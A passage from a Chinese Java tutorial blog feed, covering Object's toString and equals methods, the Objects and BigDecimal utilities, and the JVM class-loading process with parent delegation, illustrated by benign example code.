class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ObjectDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Student s = <span class="keyword">new</span> Student();</span><br><span class="line">        s.setName(<span class="string">&quot;林青霞&quot;</span>);</span><br><span class="line">        s.setAge(<span class="number">30</span>);</span><br><span class="line">        System.out.println(s); </span><br><span class="line">        System.out.println(s.toString()); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><ul><li> 运行结果： <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Student&#123;name=<span class="string">&#x27;林青霞&#x27;</span>, age=<span class="number">30</span>&#125;</span><br><span class="line">Student&#123;name=<span class="string">&#x27;林青霞&#x27;</span>, age=<span class="number">30</span>&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="4-4-Object类的equals方法"><a href="#4-4-Object类的equals方法" class="headerlink" title="4.4 Object类的equals方法"></a>4.4 Object类的equals方法</h3><ul><li>equals方法的作用 <ul><li>用于对象之间的比较，返回true和false的结果</li><li>举例：s1.equals(s2);    s1和s2是两个对象</li></ul></li><li>重写equals方法的场景 <ul><li>不希望比较对象的地址值，想要结合对象属性进行比较的时候。</li></ul></li><li><h2 id="重写equals方法的方式"><a href="#重写equals方法的方式" class="headerlink" title="重写equals方法的方式 "></a>重写equals方法的方式 </h2><pre><code>1. alt + insert  选择equals() and hashCode()，IntelliJ Default，一路next，finish即可</code></pre><ul><li><ol><li>在类的空白区域，右键 -&gt; Generate -&gt; 选择equals() and hashCode()，后面的同上。</li></ol></li></ul></li><li> 代码： <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//this -- s1</span></span><br><span class="line">        <span class="comment">//o -- s2</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span> == o) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (o == <span class="keyword">null</span> || getClass() != o.getClass()) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        Student student = (Student) o; <span class="comment">//student -- s2</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (age != student.age) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">return</span> name != <span class="keyword">null</span> ? name.equals(student.name) : student.name == <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ObjectDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Student s1 = <span class="keyword">new</span> Student();</span><br><span class="line">        s1.setName(<span class="string">&quot;林青霞&quot;</span>);</span><br><span class="line">        s1.setAge(<span class="number">30</span>);</span><br><span class="line"></span><br><span class="line">        Student s2 = <span class="keyword">new</span> Student();</span><br><span class="line">        s2.setName(<span class="string">&quot;林青霞&quot;</span>);</span><br><span class="line">        s2.setAge(<span class="number">30</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//需求：比较两个对象的内容是否相同</span></span><br><span class="line">        System.out.println(s1.equals(s2));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><ul><li> 面试题 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 看程序,分析结果</span></span><br><span class="line">String s = “abc”;</span><br><span class="line">StringBuilder sb = <span class="keyword">new</span> StringBuilder(“abc”);</span><br><span class="line">s.equals(sb); </span><br><span class="line">sb.equals(s); </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InterviewTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String s1 = <span class="string">&quot;abc&quot;</span>;</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder(<span class="string">&quot;abc&quot;</span>);</span><br><span class="line">        <span class="comment">//1.此时调用的是String类中的equals方法.</span></span><br><span class="line">        <span class="comment">//保证参数也是字符串,否则不会比较属性值而直接返回false</span></span><br><span class="line">        <span class="comment">//System.out.println(s1.equals(sb)); // false</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//StringBuilder类中是没有重写equals方法,用的就是Object类中的.</span></span><br><span class="line">        System.out.println(sb.equals(s1)); <span class="comment">// false</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="4-5-Objects"><a href="#4-5-Objects" class="headerlink" title="4.5 Objects"></a>4.5 Objects</h3><ul><li><p> 常用方法  </p><table><thead><tr><th>方法名</th><th>说明</th></tr></thead><tbody><tr><td>public static String toString(对象)</td><td>返回参数中对象的字符串表示形式。</td></tr><tr><td>public static String toString(对象, 默认字符串)</td><td>返回对象的字符串表示形式。</td></tr><tr><td>public static Boolean isNull(对象)</td><td>判断对象是否为空</td></tr><tr><td>public static Boolean nonNull(对象)</td><td>判断对象是否不为空</td></tr></tbody></table></li><li><p> 代码<br>学生类 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">      <span class="keyword">private</span> String name;</span><br><span class="line">      <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">          <span class="keyword">this</span>.name = name;</span><br><span class="line">          <span class="keyword">this</span>.age = age;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> name;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">          <span class="keyword">this</span>.name = name;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> age;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">          <span class="keyword">this</span>.age = age;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="string">&quot;Student&#123;&quot;</span> +</span><br><span class="line">                  <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                  <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                  <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li></ul><p>测试类  </p><h3 id="4-6-BigDecimal"><a href="#4-6-BigDecimal" class="headerlink" title="4.6 BigDecimal"></a>4.6 BigDecimal</h3><ul><li><p> 作用<br>可以用来进行精确计算 </p></li><li><p> 构造方法  </p><table><thead><tr><th>方法名</th><th>说明</th></tr></thead><tbody><tr><td>BigDecimal(double val)</td><td>参数为double</td></tr><tr><td>BigDecimal(String val)</td><td>参数为String</td></tr></tbody></table></li><li><p> 常用方法  </p><table><thead><tr><th>方法名</th><th>说明</th></tr></thead><tbody><tr><td>public BigDecimal add(另一个BigDecimal对象)</td><td>加法</td></tr><tr><td>public BigDecimal subtract (另一个BigDecimal对象)</td><td>减法</td></tr><tr><td>public BigDecimal multiply (另一个BigDecimal对象)</td><td>乘法</td></tr><tr><td>public BigDecimal divide (另一个BigDecimal对象)</td><td>除法</td></tr><tr><td>public BigDecimal divide (另一个BigDecimal对象，精确几位，舍入模式)</td><td>除法</td></tr></tbody></table></li><li><p>总结 </p><ol><li>BigDecimal是用来进行精确计算的</li><li>创建BigDecimal的对象，构造方法使用参数类型为字符串的。</li><li>四则运算中的除法，如果除不尽请使用divide的三个参数的方法。</li></ol></li></ul><p>示例： </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BigDecimal divide = bd1.divide(参与运算的对象,小数点后精确到多少位,舍入模式);</span><br><span class="line">参数<span class="number">1</span> ，表示参与运算的BigDecimal 对象。</span><br><span class="line">参数<span class="number">2</span> ，表示小数点后面精确到多少位</span><br><span class="line">参数<span class="number">3</span> ，舍入模式  </span><br><span class="line">  BigDecimal.ROUND_UP  进一法</span><br><span class="line">  BigDecimal.ROUND_FLOOR 去尾法</span><br><span class="line">  BigDecimal.ROUND_HALF_UP 四舍五入</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-内部类&quot;&gt;&lt;a href=&quot;#1-内部类&quot; class=&quot;headerlink&quot; title=&quot;1.内部类&quot;&gt;&lt;/a&gt;1.内部类&lt;/h2&gt;&lt;h3 id=&quot;1-1-内部类的基本使用&quot;&gt;&lt;a href=&quot;#1-1-内部类的基本使用&quot; class=&quot;headerli</summary>
      
    
    
    
    
    <category term="Java基础" scheme="http://zephyr-cyber.github.io/tags/Java%E5%9F%BA%E7%A1%80/"/>
    
    <category term="[object Object]" scheme="http://zephyr-cyber.github.io/tags/object-Object/"/>
    
    <category term="Java" scheme="http://zephyr-cyber.github.io/tags/Java/"/>
    
    <category term="基础" scheme="http://zephyr-cyber.github.io/tags/%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>Java-基础-类加载器&amp;反射</title>
    <link href="http://zephyr-cyber.github.io/bufferfly/blog/2178611771.html"/>
    <id>http://zephyr-cyber.github.io/bufferfly/blog/2178611771.html</id>
    <published>2022-12-05T10:37:12.000Z</published>
    <updated>2022-12-15T03:58:40.707Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-类加载器"><a href="#1-类加载器" class="headerlink" title="1. 类加载器"></a>1. 类加载器</h2><h3 id="1-1-概念"><a href="#1-1-概念" class="headerlink" title="1.1 概念"></a>1.1 概念</h3><ul><li> <code>Java</code>代码演变流程<br><code>Java</code>源文件  –&gt; 编译成<code>class</code>文件 –&gt;加载到内存中运行 </li><li> 类加载器的作用<br>把<code>class</code>文件加载到内存，成为一个对象（Class对象）。 </li></ul><h3 id="1-2-加载时机"><a href="#1-2-加载时机" class="headerlink" title="1.2 加载时机"></a>1.2 加载时机</h3><ol><li>创建类的实例（对象）</li><li>调用类的静态方法</li><li>访问类的静态变量</li><li>使用反射方式来强制创建某个类或接口对应的<code>java.lang.Class</code>对象</li><li>初始化某个类的子类</li><li>直接使用<code>java.exe</code>命令来运行某个主类</li></ol><p>总结一句话：首次用到就加载，不用不加载</p><p>上述六种情况都会使用到类，所以要把<code>class文件</code>加载进内存</p><h3 id="1-3-加载过程"><a href="#1-3-加载过程" class="headerlink" title="1.3 加载过程"></a>1.3 加载过程</h3><ul><li><p>加载 </p><blockquote><p>通过全限定类名找到<code>class</code>文件，并加载(读取)到内存；</p><p>把加载的内容映射成为<code>JVM</code>认可的数据结；</p><p>加载进内存后，一个<code>class</code>文件对应一个<code>Class</code>对象。（反之，不成立。动态代理，<code>Class</code>对象可以在运行期间生成（拼出来的））</p><p>一句话：读取<code>class</code>文件到内存，成为一个<code>Class</code>对象。</p></blockquote></li><li><p> 链接 </p><blockquote><ol><li> 验证：<br>链接阶段的第一步，这一阶段为了确保class文件字节流中<br>包含的信息符合当前虚拟机的要求，并且不会危害虚拟机自身安全<br>文件中的信息是否符合虚拟机规范<br>有没有安全隐患<br>作用：JVM的安全大门，防止黑客大神恶意修改的/错误的代码被运行而危害JVM </li><li> 准备：<br>负责为类的类变量（被static修饰的变量）分配内存，并给定初始化值<code>null</code>等。<br>作用：主要是为了预分配内存，而非初始化内容 </li><li> 解析：<br>将类的二进制数据流中的符号引用替换为直接引用<br>原来A类的B方法被C方法调用了，其中A、B、C，对于计算机来说是没有意义，当把他们解析并指向对应的内存空间，也就是变成直接引用之后上述代码才变得有意义。<br>作用：把代码中使用的到的信息等转换成<code>JVM</code>能识别的堆栈、引用等这些直接引用。 </li></ol></blockquote></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> String name = <span class="string">&quot;abc&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote></blockquote><ul><li><p>初始化 </p><blockquote><p>根据程序员通过程序制定的主观计划去初始化类变量和其他资源→静态变量赋值以及初始化其他资源。eg：<code>static String school = &quot;传智大学&quot;;</code></p><p>作用：这一步才是真正去执行类初始化的代码逻辑。包括执行static静态代码块，给静态变量赋值等</p></blockquote></li><li><p>相关概念 </p><ul><li>全类名：就是全限定类名，包含了包名+类名</li></ul></li><li><p>总结 </p><ol><li> 当一个类被使用的时候，才会加载到内存成为一个<code>Class</code>对象 </li><li>类加载的过程如下：<br>加载、链接（验证、准备、解析）、初始化 </li></ol></li></ul><h3 id="1-4-类加载器的分类及作用"><a href="#1-4-类加载器的分类及作用" class="headerlink" title="1.4 类加载器的分类及作用"></a>1.4 类加载器的分类及作用</h3><h4 id="1-4-1-分类"><a href="#1-4-1-分类" class="headerlink" title="1.4.1 分类"></a>1.4.1 分类</h4><ul><li>JDK8及以前 <ul><li> 系统类加载器(应用类加载器)（AppClassLoader） </li><li> 拓展类加载器（ExtClassLoader） </li><li> 启动类加载器（BootstrapClassloader） </li></ul></li><li>JDK8之后 <ul><li>系统类加载器(应用类加载器)（AppClassLoader）</li><li>平台类加载器（PlatformClassLoader）</li><li>启动类加载器（BootstrapClassloader）</li></ul></li></ul><h4 id="1-4-2-子父关系"><a href="#1-4-2-子父关系" class="headerlink" title="1.4.2 子父关系"></a>1.4.2 子父关系</h4><p>子父关系如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//&gt;jdk8 // (系统)应用类加载器  -- &gt;  平台类加载器(爹)  --&gt; 启动类加载器(爷) </span></span><br><span class="line"><span class="comment">//≤jdk8 // (系统)应用类加载器  -- &gt;  拓展类加载器(爹)  --&gt; 启动类加载器 (爷)</span></span><br></pre></td></tr></table></figure><p>注意：</p><ul><li> 这里说的子父关系，并不是Java中继承关系中的子父关系；是一种(业务/设计)逻辑上的子父。 </li><li> APPClassLoader继承关系如下<br><img src="https://pic.imgdb.cn/item/639a8a2cb1fccdcd36d2b79d.png"></li><li> ExtClassLoader继承关系如下<br><img src="https://pic.imgdb.cn/item/639a8a2cb1fccdcd36d2b7a5.png"></li><li> 对比 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Java中继承的子父，B是父，A是子</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">extends</span> <span class="title">B</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在类加载器中，不是这种继承关系，C类型的类加载器的父亲是D类型的类加载的时候，通过C的一个parent属性来体现的</span></span><br><span class="line">ApplClassLoader &#123;</span><br><span class="line">  ClassLoader parent = ExtClassLoader的对象</span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">ExtClassLoader &#123;</span><br><span class="line">  ClassLoader parent = BootstrapClassLoader的对象</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="1-4-3-职能"><a href="#1-4-3-职能" class="headerlink" title="1.4.3 职能"></a>1.4.3 职能</h4><p>每个类加载器的功能，不同的类加载器会加载对应位置的类（JDK8及以前）。</p><ul><li>启动类加载器加载的是<code>jre</code>的核心类库里面的类 <code>JAVA_HOME\jre\lib\rt.jar</code></li><li>拓展类加载器加载<code>jre</code>的拓展<code>jar</code>包：<code>JAVA_HOME\jre\ext\*.jar</code>下的<code>jar</code>包</li><li>应用类加载器加载当前项目类路径（CLASSPATH、导入的jar包）类或jar包中的类</li></ul><h4 id="1-4-4-演变过程"><a href="#1-4-4-演变过程" class="headerlink" title="1.4.4 演变过程"></a>1.4.4 演变过程</h4><p><code>jdk8</code>及以前版本的拓展类加载器(<code>ExtClassLoader</code>)，对应的就是后期版本的平台类加载器（<code>PlatformClassLoader</code>）；但是<code>平台类加载器</code>已经被阉割，不会承担任何工作；存在的意义只有一个，就是兼容之前的版本。</p><p><code>jdk8</code>以后的版本，拓展类加载器更名为平台类加载器，并把自己加载的任务全部交给了<strong>启动类加载器</strong>。</p><p>应用类加载器没有变化</p><h3 id="1-5-类加载机制"><a href="#1-5-类加载机制" class="headerlink" title="1.5 类加载机制"></a>1.5 类加载机制</h3><h4 id="1-5-1-基本概念"><a href="#1-5-1-基本概念" class="headerlink" title="1.5.1 基本概念"></a>1.5.1 基本概念</h4><ol><li><strong>缓存机制</strong>：所有加载过的<code>C1ass</code>对象都会被缓存。当程序中需要使用某个<code>Class</code>对象时，类加载器先从缓存区中查找该<code>Class</code>对象，找到直接返回而非重新加载（这就是为什么修改了代码后，必须重新启动JVM程序所做的修改才会生效的原因）；找不到才会读取该类对应的<code>class</code>文件二进制数据，并将其转换成<code>Class</code>对象，并存入缓存区中。</li><li><strong>双亲委派</strong>：当加载一个类的时候，先让<code>parent</code>(父）类加载器试图查找缓存并加载该<code>class</code>，只有在父类加载器查找失败并无法加载该类时，才尝试从自己的负责的位置中加载该类。 <ul><li>坑爹，能让老子的干的，自己绝对不动手。</li></ul></li></ol><h3 id="1-5-2-双亲委派的作用"><a href="#1-5-2-双亲委派的作用" class="headerlink" title="1.5.2 双亲委派的作用"></a>1.5.2 双亲委派的作用</h3><ol><li>提高安全性：如果可能，保证某个类优先由根(启动)类加载器加载；继而保证了安全性</li><li>提高性能：某个类，只会被加载一次；节省内存空间的同时，方便维护管理；降低了磁盘IO次数，提高性能。</li></ol><p><img src="https://pic.imgdb.cn/item/639a8a30b1fccdcd36d2be05.png"></p><p><img src="https://pic.imgdb.cn/item/639a8a2cb1fccdcd36d2b7ac.png"></p><h4 id="1-5-3-演示代码"><a href="#1-5-3-演示代码" class="headerlink" title="1.5.3  演示代码"></a>1.5.3  演示代码</h4><ul><li> <code>HelloWorld.java</code> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itheima.loadpolicy;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 你好，世界！</span></span><br><span class="line"><span class="comment"> * 该代码可以正常运行</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span> Vsunks.v</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Blog</span> blog.sunxiaowei.net/996.mba</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: HelloWorld</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;HelloWorld&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><ul><li> 自定义<code>String</code>类 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> java.lang;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 自己写的String类。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 该类的main方法不能正确执行，报错，提示信息如下：</span></span><br><span class="line"><span class="comment"> * 错误: 在类 java.lang.String 中找不到 main 方法, 请将 main 方法定义为:</span></span><br><span class="line"><span class="comment"> *  public static void main(String[] args)</span></span><br><span class="line"><span class="comment"> *否则 JavaFX 应用程序类必须扩展javafx.application.Application</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 因为java.lang.String类在java核心jar包中存在，按照双亲委派机制，会优先由启动类加载器在核心jar包中加载并使用；核心Jar包中的这个类没有main方法，所以调用main方法报错，说找不到main方法。</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span> Vsunks.v</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Blog</span> blog.sunxiaowei.net/996.mba</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: 自己写的String类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">String</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;自己写的String类的main方法执行成功.....&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="1-6-常用API"><a href="#1-6-常用API" class="headerlink" title="1.6 常用API"></a>1.6 常用API</h3><h4 id="1-6-1-API介绍"><a href="#1-6-1-API介绍" class="headerlink" title="1.6.1 API介绍"></a>1.6.1 API介绍</h4><p><code>静态方法：ClassLoader.getSystemClassLoader()</code>获取系统(应用)类加载器</p><p>补：获取应用类加载器的另外一种方式：<code>自定义的类.class.getClassLoader()</code></p><p><strong>下面这个方法比较重要！！！！！！</strong></p><p>应用类加载器的非静态方法：InputStream resourceAsStream = currentClassLoader.getResourceAsStream(“prop.properties”);  从类路径下加载文件</p><p>应用场景：</p><ol><li><strong>从类路径下手动读取一个配置文件</strong></li><li>（学习过程中）从类路径下读取一个其他的文件</li></ol><h4 id="1-6-2-相关知识"><a href="#1-6-2-相关知识" class="headerlink" title="1.6.2 相关知识"></a>1.6.2 相关知识</h4><ol><li> <code>src路径</code>：源码路径 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// D:\Develop\WokKStation\java65\day15_01_classloader\src\</span></span><br></pre></td></tr></table></figure></li></ol><ol start="2"><li> out里面：类路径（目前java项目） <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// D:/Develop/WokKStation/java65/out/production/day15_01_classloader/</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="1-7-代码"><a href="#1-7-代码" class="headerlink" title="1.7 代码"></a>1.7 代码</h3><ul><li> 类加载器讲解 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 